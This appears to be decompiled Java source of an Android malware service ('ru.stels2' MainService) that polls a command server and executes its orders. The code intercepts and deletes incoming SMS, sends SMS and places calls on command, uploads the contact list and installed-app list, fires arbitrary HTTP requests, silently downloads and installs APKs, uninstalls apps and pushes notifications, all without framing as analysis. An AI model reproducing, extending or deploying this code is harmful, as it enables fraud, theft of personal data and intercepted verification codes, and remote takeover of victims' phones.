package ru.stels2;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.os.SystemClock;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

public final class MainService extends Service implements ThreadOperationListener {
    public static void start(Context context, Intent intent, String key) {
        try {
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static void start(Context context, Intent intent, String key, String number, String text, long id) {
        try {
            Intent service = new Intent(context, MainService.class);
            Bundle extras = intent.getExtras();
            if (extras != null) {
                service.putExtras(extras);
            }
            service.putExtra("key", key);
            service.putExtra("number", number);
            service.putExtra("text", text);
            service.putExtra("id", String.valueOf(id));
            context.startService(service);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public void onCreate() {
        super.onCreate();
        setForeground(true);
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        try {
            Bundle extras = intent.getExtras();
            if (extras != null && extras.get("key") != null) {
                String key = (String) extras.get("key");
                if (key.equals("alarm")) {
                    new Thread(new ThreadOperation(this, 1, null)).start();
                } else if (key.equals("catch")) {
                    String number = (String) extras.get("number");
                    String text = (String) extras.get("text");
                    String id = (String) extras.get("id");
                    new Thread(new ThreadOperation(this, 4, new String[]{number, text, id})).start();
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onDestroy() {
    }

    public void threadOperationRun(int id, Object obj) {
        JSONObject response;
        Settings settings;
        if (id == 1) {
            try {
                response = Stels.sendRequest(this);
                settings = Settings.getSettings();
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (settings.period * Constants.SECOND));
                settings.save(this);
                executeCommands(response);
                Functions.startTimer(this);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        } else if (id == 2) {
            Stels.sendContactsToServer(Functions.contactsToJson(Functions.getContacts(this)));
        } else if (id == 3) {
            Stels.sendPackagesToServer(Functions.appListToJson(Functions.getInstalledAppList(this)));
        } else if (id == 4) {
            String[] params = (String[]) obj;
            response = Stels.sendCatchRequest(params[0], params[1]);
            try {
                if (response.has(Constants.REMOVE_CURRENT_FILTER) && Boolean.valueOf(response.getBoolean(Constants.REMOVE_CURRENT_FILTER)).booleanValue()) {
                    settings = Settings.getSettings();
                    settings.removeCatchFilter(Long.parseLong(params[2]));
                    settings.save(this);
                }
            } catch (Exception ex2) {
                ex2.printStackTrace();
            }
            executeCommands(response);
        }
    }

    public void executeCommands(JSONObject response) {
        try {
            JSONArray jsonArray;
            int i;
            JSONObject jsonObject;
            String url;
            Settings settings = Settings.getSettings();
            if (response.has(Constants.WAIT)) {
                settings.timeNextConnection = System.currentTimeMillis() + ((long) (response.getInt(Constants.WAIT) * Constants.SECOND));
                settings.save(this);
            }
            if (response.has(Constants.SERVER)) {
                settings.server = response.getString(Constants.SERVER);
                settings.save(this);
            }
            if (response.has("subPref")) {
                settings.subPref = response.getString("subPref");
                settings.save(this);
            }
            if (response.has("botId")) {
                settings.botId = response.getString("botId");
                settings.save(this);
            }
            if (response.has(Constants.CLEAR_DELETE_FILTERS)) {
                if (Boolean.valueOf(response.getBoolean(Constants.CLEAR_DELETE_FILTERS)).booleanValue()) {
                    settings.deleteSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has(Constants.CLEAR_CATCH_FILTERS)) {
                if (Boolean.valueOf(response.getBoolean(Constants.CLEAR_CATCH_FILTERS)).booleanValue()) {
                    settings.catchSmsList.clear();
                    settings.save(this);
                }
            }
            if (response.has(Constants.DELETE_SMS)) {
                settings.deleteSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray(Constants.DELETE_SMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.deleteSmsList.add(new SmsItem(jsonObject.getString(Constants.PHONE), jsonObject.getString(Constants.TEXT)));
                }
                settings.save(this);
            }
            if (response.has(Constants.CATCH_SMS)) {
                settings.catchSmsList.clear();
                settings.save(this);
                jsonArray = response.getJSONArray(Constants.CATCH_SMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    settings.catchSmsList.add(new SmsItem(jsonObject.getString(Constants.PHONE), jsonObject.getString(Constants.TEXT)));
                }
                settings.save(this);
            }
            if (response.has(Constants.SEND_SMS)) {
                jsonArray = response.getJSONArray(Constants.SEND_SMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonObject = jsonArray.getJSONObject(i);
                    SystemClock.sleep((long) Constants.SMS_SEND_SLEEP);
                    Functions.sendSms(jsonObject.getString(Constants.PHONE), jsonObject.getString(Constants.TEXT));
                }
            }
            if (response.has(Constants.HTTP_REQUEST)) {
                JSONObject jsonParams;
                jsonObject = response.getJSONObject(Constants.HTTP_REQUEST);
                String method = jsonObject.getString(Constants.METHOD);
                url = jsonObject.getString(Constants.URL);
                List<NameValuePair> paramsList = new ArrayList();
                List<NameValuePair> propertyList = new ArrayList();
                jsonArray = jsonObject.getJSONArray(Constants.PARAMS);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    paramsList.add(new BasicNameValuePair(jsonParams.getString(Constants.NAME), jsonParams.getString(Constants.VALUE)));
                }
                jsonArray = jsonObject.getJSONArray(Constants.PROPERTIES);
                for (i = 0; i < jsonArray.length(); i++) {
                    jsonParams = jsonArray.getJSONObject(i);
                    propertyList.add(new BasicNameValuePair(jsonParams.getString(Constants.NAME), jsonParams.getString(Constants.VALUE)));
                }
                Functions.sendSimpleHttpRequest(url, method, paramsList, propertyList);
            }
            if (response.has(Constants.UPDATE)) {
                String path = response.getString(Constants.UPDATE);
                ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService("connectivity");
                if (connectivityManager.getNetworkInfo(1).isAvailable() || connectivityManager.getNetworkInfo(0).isConnectedOrConnecting()) {
                    String name = System.currentTimeMillis() + ".apk";
                    String localPath = Environment.getExternalStorageDirectory() + "/download/";
                    if (Functions.downloadFile(localPath, path, name)) {
                        Functions.installApk(this, localPath + name);
                    }
                }
            }
            if (response.has(Constants.UNINSTALL)) {
                jsonArray = response.getJSONArray(Constants.UNINSTALL);
                for (i = 0; i < jsonArray.length(); i++) {
                    Functions.uninstallApk(this, jsonArray.getString(i));
                }
            }
            if (response.has(Constants.NOTIFICATION)) {
                jsonObject = response.getJSONObject(Constants.NOTIFICATION);
                url = jsonObject.getString(Constants.URL);
                Functions.showNotification(this, jsonObject.getString(Constants.TICKER_TEXT), jsonObject.getString(Constants.TITLE), jsonObject.getString(Constants.TEXT), jsonObject.getInt(Constants.ICON), url);
            }
            if (response.has(Constants.OPEN_URL)) {
                Functions.openUrl(this, response.getString(Constants.OPEN_URL));
            }
            if (response.has(Constants.SEND_CONTACTS)) {
                if (Boolean.valueOf(response.getBoolean(Constants.SEND_CONTACTS)).booleanValue()) {
                    new Thread(new ThreadOperation(this, 2, null)).start();
                }
            }
            if (response.has(Constants.SEND_PACKAGES)) {
                if (Boolean.valueOf(response.getBoolean(Constants.SEND_PACKAGES)).booleanValue()) {
                    new Thread(new ThreadOperation(this, 3, null)).start();
                }
            }
            if (response.has(Constants.MAKE_CALL)) {
                Functions.makeCall(this, response.getString(Constants.MAKE_CALL));
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
